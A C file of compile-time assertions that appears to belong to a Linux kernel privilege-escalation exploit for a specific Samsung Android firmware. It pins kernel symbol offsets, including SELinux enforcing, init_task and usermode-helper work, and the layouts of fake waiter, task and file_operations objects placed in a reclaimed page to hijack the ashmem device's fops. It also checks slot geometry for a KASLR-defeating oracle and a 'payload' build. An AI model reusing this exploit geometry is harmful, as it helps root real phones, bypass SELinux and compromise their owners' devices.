/*
 * Host-side checks for the S928BXXU6EZIF profile.
 *
 * The NDK build asserts the same geometry when it runs; this translation unit
 * needs only a host C11 compiler because target.h pulls in nothing but
 * ezif_layout.h.  Compile it with:
 *
 *   clang -std=c11 -fsyntax-only -I src tools/layout_check.c
 *
 * ALLOW_UNVERIFIED_S928B is defined below solely to get past the gate; the
 * value it admits is still unmeasured and the assertions here only bound it.
 * APP_PAYLOAD selects the superset of the profile: the bank and oracle macros
 * exist only in the payload build.
 */
#define ALLOW_UNVERIFIED_S928B 1
#define APP_PAYLOAD 1
#include "targets/e3q-S928BXXU6EZIF/target.h"

/* Image image_size from its PE optional header. */
#define IMAGE_BYTES 0x2710000ULL
/* PAGE_SIZE << MM_ORDER from src/common.h, not available host-side. */
#define ORDER3_BYTES 0x8000ULL

/* BTF sizes from tools/inspect_image.py btf (see docs/PORT-STATUS.md). */
#define BTF_TASK_STRUCT 0x12c0ULL
#define BTF_FILE_OPERATIONS 0x110ULL
#define BTF_RT_MUTEX_BASE 0x20ULL
#define BTF_SLAB 0x40ULL
#define BTF_WAITER 0x58ULL
#define BTF_CONFIGFS_BUFFER 0x80ULL
#define BTF_WORKQUEUE 0x140ULL
#define BTF_POOL_WORKQUEUE 0x100ULL
#define BTF_WORKER_POOL 0x320ULL
#define BTF_WORK 0x30ULL
#define BTF_RB_NODE 0x18ULL
/* src/root.c, which static-asserts both sizes itself. */
#define UMH_SUBPROCESS_INFO 0x70ULL
#define UMH_KERNEL_DATA 0x168ULL

#define SYM_IN_IMAGE4(name) \
  _Static_assert((name) < IMAGE_BYTES && ((name) & 3) == 0, \
                 #name " leaves the Image or is not 4-byte aligned")
#define SYM_IN_IMAGE8(name) \
  _Static_assert((name) < IMAGE_BYTES && ((name) & 7) == 0, \
                 #name " leaves the Image or is not 8-byte aligned")

/* A kallsyms address is the Image offset of the symbol; every one of these
 * must land inside the Image the fingerprint was generated from. */
SYM_IN_IMAGE8(ASHMEM_MISC_FOPS_OFF);
SYM_IN_IMAGE8(ASHMEM_FOPS_OFF);
SYM_IN_IMAGE4(ASHMEM_IOCTL_OFF);
SYM_IN_IMAGE4(ASHMEM_COMPAT_IOCTL_OFF);
SYM_IN_IMAGE4(ASHMEM_MMAP_OFF);
SYM_IN_IMAGE8(ASHMEM_OPEN_OFF);
SYM_IN_IMAGE8(ASHMEM_RELEASE_OFF);
SYM_IN_IMAGE8(ASHMEM_SHOW_FDINFO_OFF);
SYM_IN_IMAGE4(CONFIGFS_READ_ITER_OFF);
SYM_IN_IMAGE4(CONFIGFS_BIN_WRITE_ITER_OFF);
SYM_IN_IMAGE4(COPY_SPLICE_READ_OFF);
SYM_IN_IMAGE4(NOOP_LLSEEK_OFF);
SYM_IN_IMAGE8(INIT_TASK_OFF);
SYM_IN_IMAGE8(ROOT_TASK_GROUP_OFF);
SYM_IN_IMAGE8(SELINUX_ENFORCING_OFF);
SYM_IN_IMAGE8(KMALLOC_CACHES_OFF);
SYM_IN_IMAGE8(ANON_PIPE_BUF_OPS_OFF);
SYM_IN_IMAGE8(CALL_USERMODEHELPER_EXEC_WORK_OFF);
SYM_IN_IMAGE8(SYSTEM_UNBOUND_WQ_OFF);
SYM_IN_IMAGE8(SLIDE_LOGGERS_0_1_OFF);
SYM_IN_IMAGE8(SLIDE_RANDOM_BOOT_ID_DATA_OFF);
SYM_IN_IMAGE8(SLIDE_SYSCTL_BOOTID_OFF);
SYM_IN_IMAGE4(SLIDE_TRACEFS_WORKER_CALLER_OFF);
SYM_IN_IMAGE8(SLIDE_S928_PROBE_TARGET_IMAGE_OFF);
/* SLIDE_NFULNL_LOGGER_OFF is a string offset, not a symbol, so the only
 * requirement is that the 14-byte name stays inside the Image. */
_Static_assert(SLIDE_NFULNL_LOGGER_OFF + 14 <= IMAGE_BYTES,
               "nfulnl_logger name leaves the Image");
/* The probe reads the miscdevice .fops field it later overwrites. */
_Static_assert(SLIDE_S928_PROBE_TARGET_IMAGE_OFF == ASHMEM_MISC_FOPS_OFF,
               "probe target is not the miscdevice .fops field");

_Static_assert((P0_PHYS_OFFSET & 0xfff) == 0, "memstart is not page aligned");
/* phys_load, not memstart, is where the boot chain places the Image; arm64
 * requires 2 MiB alignment for it. */
_Static_assert((P0_KERNEL_PHYS_LOAD & 0x1fffff) == 0,
               "kernel load address is not 2 MiB aligned");
_Static_assert(P0_KERNEL_PHYS_LOAD >= P0_PHYS_OFFSET,
               "kernel load address precedes the first RAM page");
/* sec_xbl_ramdump@a7d00000 reserves three megabytes ending at 0xa8000000
 * (evidence/dtbo-reserved.md); a load address inside it is a measured value
 * that contradicts the vendor DT. */
_Static_assert(!(P0_KERNEL_PHYS_LOAD >= 0xa7d00000ULL &&
                 P0_KERNEL_PHYS_LOAD < 0xa8000000ULL),
               "kernel load address falls in the XBL ramdump carveout");
/* xbl_config.elf's memorymap labels exactly one region Kernel: 0xa8000000 +
 * 0x10000000.  A load address outside it, or an Image that does not fit,
 * would contradict the boot chain's own map (evidence/xbl-memorymap.md). */
_Static_assert(P0_KERNEL_PHYS_LOAD >= 0xa8000000ULL &&
                   P0_KERNEL_PHYS_LOAD < 0xb8000000ULL,
               "kernel load address leaves the BL Kernel region");
_Static_assert(P0_KERNEL_PHYS_LOAD + IMAGE_BYTES <= 0xb8000000ULL,
               "Image span leaves the BL Kernel region");

/* p0_data_alias()/p0_alias_image_offset() OR the physical delta into
 * P0_PAGE_OFFSET, so the delta must not reach any bit PAGE_OFFSET already
 * sets and the result must stay in the direct map. */
#define ALIAS_OF(off) \
  (P0_PAGE_OFFSET | ((off) + (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)))
_Static_assert(((P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET) + SLIDE_SYSCTL_BOOTID_OFF) <
                   (1ULL << 39),
               "physical delta reaches a PAGE_OFFSET bit");
_Static_assert(ALIAS_OF(ASHMEM_FOPS_OFF) >= DIRECT_MAP_BASE &&
                   ALIAS_OF(ASHMEM_FOPS_OFF) < DIRECT_MAP_END,
               "misc_fops alias leaves the direct map");
_Static_assert(ALIAS_OF(SLIDE_SYSCTL_BOOTID_OFF) >= DIRECT_MAP_BASE &&
                   ALIAS_OF(SLIDE_SYSCTL_BOOTID_OFF) < DIRECT_MAP_END,
               "boot_id alias leaves the direct map");

/* rt_mutex_waiter: every field abuts the next and the last one ends the object. */
_Static_assert(FAKE_WAITER_LAYOUT_SIZE == BTF_WAITER,
               "fake waiter disagrees with BTF sizeof");
_Static_assert(FAKE_WAITER_PI_TREE_ENTRY_OFF + BTF_RB_NODE == FAKE_WAITER_TASK_OFF,
               "fake waiter pi_tree_entry/task gap");
_Static_assert(FAKE_WAITER_TASK_OFF + 8 == FAKE_WAITER_LOCK_OFF,
               "fake waiter task/lock gap");
_Static_assert(FAKE_WAITER_LOCK_OFF + 8 == FAKE_WAITER_WAKE_STATE_OFF,
               "fake waiter lock/wake_state gap");
_Static_assert(FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PRIO_OFF,
               "fake waiter wake_state/prio gap");
_Static_assert(FAKE_WAITER_PRIO_OFF + 4 == FAKE_WAITER_DEADLINE_OFF,
               "fake waiter prio/deadline gap");
_Static_assert(FAKE_WAITER_DEADLINE_OFF + 8 == FAKE_WAITER_WW_CTX_OFF,
               "fake waiter deadline/ww_ctx gap");
_Static_assert(FAKE_WAITER_WW_CTX_OFF + 8 == FAKE_WAITER_LAYOUT_SIZE,
               "fake waiter ww_ctx is not last");
_Static_assert(FAKE_WAITER_LOCK_OFF == 0x38 && FAKE_WAITER_PI_TREE_ENTRY_OFF == 0x18,
               "fake waiter no longer starts the pi_tree_entry at rb_erase's offset");

/* task_struct fields the PI walk touches. */
_Static_assert(FAKE_TASK_USAGE_OFF + 4 <= BTF_TASK_STRUCT, "fake task usage");
_Static_assert(FAKE_TASK_PRIO_OFF + 4 <= BTF_TASK_STRUCT, "fake task prio");
_Static_assert(FAKE_TASK_NORMAL_PRIO_OFF + 4 <= BTF_TASK_STRUCT,
               "fake task normal_prio");
_Static_assert(FAKE_TASK_TASK_GROUP_OFF + 8 <= BTF_TASK_STRUCT,
               "fake task sched_task_group");
_Static_assert(FAKE_TASK_PI_LOCK_OFF + 4 <= BTF_TASK_STRUCT, "fake task pi_lock");
_Static_assert(FAKE_TASK_PI_WAITERS_OFF + 16 <= BTF_TASK_STRUCT,
               "fake task pi_waiters");
_Static_assert(FAKE_TASK_PI_TOP_TASK_OFF + 8 <= BTF_TASK_STRUCT,
               "fake task pi_top_task");
_Static_assert(FAKE_TASK_PI_BLOCKED_ON_OFF + 8 <= BTF_TASK_STRUCT,
               "fake task pi_blocked_on");
_Static_assert(FAKE_TASK_PI_LOCK_OFF == 0x924 && FAKE_TASK_PI_WAITERS_OFF == 0x938 &&
                   FAKE_TASK_PI_TOP_TASK_OFF == 0x948 &&
                   FAKE_TASK_PI_BLOCKED_ON_OFF == 0x950,
               "fake task PI fields are not the BTF offsets");

/* file_operations: only the slots the fake table populates. */
_Static_assert(FOPS_OWNER_OFF == 0, "fops owner is not first");
_Static_assert(FOPS_LLSEEK_OFF + 8 <= BTF_FILE_OPERATIONS, "fops llseek");
_Static_assert(FOPS_READ_OFF + 8 <= BTF_FILE_OPERATIONS, "fops read");
_Static_assert(FOPS_WRITE_OFF + 8 <= BTF_FILE_OPERATIONS, "fops write");
_Static_assert(FOPS_READ_ITER_OFF + 8 <= BTF_FILE_OPERATIONS, "fops read_iter");
_Static_assert(FOPS_WRITE_ITER_OFF + 8 <= BTF_FILE_OPERATIONS, "fops write_iter");
_Static_assert(FOPS_IOCTL_OFF + 8 <= BTF_FILE_OPERATIONS, "fops ioctl");
_Static_assert(FOPS_COMPAT_IOCTL_OFF + 8 <= BTF_FILE_OPERATIONS, "fops compat_ioctl");
_Static_assert(FOPS_MMAP_OFF + 8 <= BTF_FILE_OPERATIONS, "fops mmap");
_Static_assert(FOPS_OPEN_OFF + 8 <= BTF_FILE_OPERATIONS, "fops open");
_Static_assert(FOPS_RELEASE_OFF + 8 <= BTF_FILE_OPERATIONS, "fops release");
_Static_assert(FOPS_SPLICE_READ_OFF + 8 <= BTF_FILE_OPERATIONS, "fops splice_read");
_Static_assert(FOPS_SHOW_FDINFO_OFF + 8 <= BTF_FILE_OPERATIONS, "fops show_fdinfo");
_Static_assert(FOPS_SHOW_FDINFO_OFF + 8 == 0xe8, "fops last field moved");

_Static_assert(CFG_PAGE_OFF + 8 <= BTF_CONFIGFS_BUFFER, "cfg page");
_Static_assert(CFG_NEEDS_READ_FILL_OFF + 4 <= BTF_CONFIGFS_BUFFER, "cfg needs_read_fill");
_Static_assert(CFG_BIN_BUFFER_OFF + 8 <= BTF_CONFIGFS_BUFFER, "cfg bin_buffer");
_Static_assert(CFG_BIN_BUFFER_SIZE_OFF + 4 <= BTF_CONFIGFS_BUFFER, "cfg bin_buffer_size");
_Static_assert(CFG_CB_MAX_SIZE_OFF + 4 <= BTF_CONFIGFS_BUFFER, "cfg cb_max_size");
_Static_assert(WQ_DFL_PWQ_OFF + 8 <= BTF_WORKQUEUE, "wq dfl_pwq");
_Static_assert(PWQ_POOL_OFF + 8 <= BTF_POOL_WORKQUEUE, "pwq pool");
_Static_assert(PWQ_WQ_OFF + 8 <= BTF_POOL_WORKQUEUE, "pwq wq");
_Static_assert(PWQ_WORK_COLOR_OFF + 4 <= BTF_POOL_WORKQUEUE, "pwq work_color");
_Static_assert(PWQ_REFCNT_OFF + 4 <= BTF_POOL_WORKQUEUE, "pwq refcnt");
_Static_assert(PWQ_NR_IN_FLIGHT_OFF + 4 <= BTF_POOL_WORKQUEUE, "pwq nr_in_flight");
_Static_assert(PWQ_NR_ACTIVE_OFF + 4 <= BTF_POOL_WORKQUEUE, "pwq nr_active");
_Static_assert(PWQ_MAX_ACTIVE_OFF + 4 <= BTF_POOL_WORKQUEUE, "pwq max_active");
_Static_assert(POOL_WORKLIST_OFF + 16 <= BTF_WORKER_POOL, "pool worklist");
_Static_assert(POOL_NR_IDLE_OFF + 4 <= BTF_WORKER_POOL, "pool nr_idle");
_Static_assert(WORK_DATA_OFF == 0 && WORK_ENTRY_OFF + 16 <= BTF_WORK, "work entry");
_Static_assert(WORK_FUNC_OFF + 8 <= BTF_WORK, "work func");
_Static_assert(STRUCT_PAGE_SIZE == BTF_SLAB, "struct page/slab size");
_Static_assert(STRUCT_PAGE_COMPOUND_HEAD_OFF + 8 <= BTF_SLAB, "compound_head");
_Static_assert(STRUCT_SLAB_CACHE_OFF + 8 <= BTF_SLAB, "slab_cache");
_Static_assert(STRUCT_PAGE_TYPE_OFF + 4 <= BTF_SLAB, "page_type");

/* One reclaimed order-3 page holds every fake object in payload order. */
_Static_assert(FOPS_OFF + BTF_FILE_OPERATIONS <= LOCK_OFF,
               "fops table overlaps the fake lock");
_Static_assert(LOCK_OFF + BTF_RT_MUTEX_BASE <= W0_OFF,
               "fake lock overlaps the fake waiter");
_Static_assert(W0_OFF + FAKE_WAITER_LAYOUT_SIZE <= SCRATCH_OFF,
               "fake waiter overlaps scratch");
_Static_assert(FOPS_OFF + 0x700 + BTF_CONFIGFS_BUFFER <= SCRATCH_OFF,
               "slide scratch overlaps the fops-page scratch");
_Static_assert(SCRATCH_OFF + BTF_CONFIGFS_BUFFER <= FAKE_TASK_OFF,
               "scratch overlaps the fake task");
_Static_assert(FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8 <= RIGHT_OFF,
               "fake task's last field reaches the right rb node");
_Static_assert(RIGHT_OFF + BTF_RB_NODE <= LEFT_OFF,
               "right rb node overlaps the left rb node");
_Static_assert(LEFT_OFF + BTF_RB_NODE <= ROOT_UMH_WORK_OFF,
               "left rb node overlaps the fake work");
_Static_assert(ROOT_UMH_WORK_OFF + UMH_SUBPROCESS_INFO <= ROOT_UMH_DATA_OFF,
               "fake work overlaps the umh data");
_Static_assert(ROOT_UMH_DATA_OFF + UMH_KERNEL_DATA <= ORDER3_BYTES,
               "umh data leaves the reclaimed page");

/* Bank geometry, mirrored from the asserts in src/util.c so the profile can be
 * validated before an NDK build exists. */
_Static_assert(SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
                       FAKE_TASK_PI_BLOCKED_ON_OFF + 8 <= SLIDE_BANK_LOCK_OFF,
               "slide task bank overlaps lock bank");
_Static_assert(SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
                       SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= ORDER3_BYTES,
               "slide lock bank exceeds reclaimed page");
_Static_assert(SLIDE_BANK_WAITER_OFF >= BTF_RT_MUTEX_BASE,
               "bank waiter sits inside the bank lock");

/* The oracle uses one slot per role and the production write uses the last. */
_Static_assert(P0_ORACLE_GATE_SLOT < SLIDE_BANK_SLOTS &&
                   P0_ORACLE_PROBE_SLOT < SLIDE_BANK_SLOTS &&
                   P0_ORACLE_GATE_RESTORE_SLOT < SLIDE_BANK_SLOTS &&
                   P0_ORACLE_PROBE_RESTORE_SLOT < SLIDE_BANK_SLOTS &&
                   P0_ORACLE_PRODUCTION_SLOT < SLIDE_BANK_SLOTS,
               "oracle slot outside the bank");
_Static_assert(P0_ORACLE_GATE_SLOT != P0_ORACLE_PROBE_SLOT &&
                   P0_ORACLE_GATE_SLOT != P0_ORACLE_GATE_RESTORE_SLOT &&
                   P0_ORACLE_GATE_SLOT != P0_ORACLE_PROBE_RESTORE_SLOT &&
                   P0_ORACLE_GATE_SLOT != P0_ORACLE_PRODUCTION_SLOT &&
                   P0_ORACLE_PROBE_SLOT != P0_ORACLE_GATE_RESTORE_SLOT &&
                   P0_ORACLE_PROBE_SLOT != P0_ORACLE_PROBE_RESTORE_SLOT &&
                   P0_ORACLE_PROBE_SLOT != P0_ORACLE_PRODUCTION_SLOT &&
                   P0_ORACLE_GATE_RESTORE_SLOT != P0_ORACLE_PROBE_RESTORE_SLOT &&
                   P0_ORACLE_GATE_RESTORE_SLOT != P0_ORACLE_PRODUCTION_SLOT &&
                   P0_ORACLE_PROBE_RESTORE_SLOT != P0_ORACLE_PRODUCTION_SLOT,
               "oracle roles share a bank slot");
_Static_assert(P0_ORACLE_PRODUCTION_SLOT == SLIDE_BANK_SLOTS - 1,
               "production slot is not the last bank slot");

/* Fingerprint rows cover slides 0..31 and the probe must source all of them. */
_Static_assert(SLIDE_MAX_ATTEMPTS == 32, "fingerprint row count");
_Static_assert((P0_ORACLE_PROBE_OFFSET & 0xffff) == 0,
               "probe offset is not 64 KiB aligned");
_Static_assert(P0_ORACLE_PROBE_OFFSET >= (SLIDE_MAX_ATTEMPTS - 1) * 0x10000ULL,
               "probe offset cannot source the last row");
_Static_assert(P0_ORACLE_PROBE_OFFSET + 0xe00 + 8 <= IMAGE_BYTES,
               "probe page leaves the Image");

/* pselect fd-set word 3 is the waiter: pt_regs-0x200 is the fd_set_bits array
 * and pt_regs-0x1e8 is the futex waiter (both from this Image's frames). */
_Static_assert(SLIDE_PSELECT_WORD_SHIFT == (0x200 - 0x1e8) / 8,
               "pselect word shift does not match the waiter offset");
_Static_assert(SLIDE_TRACEFS_EVENT_ID == 106, "tracefs event id");

int main(void) { return 0; }
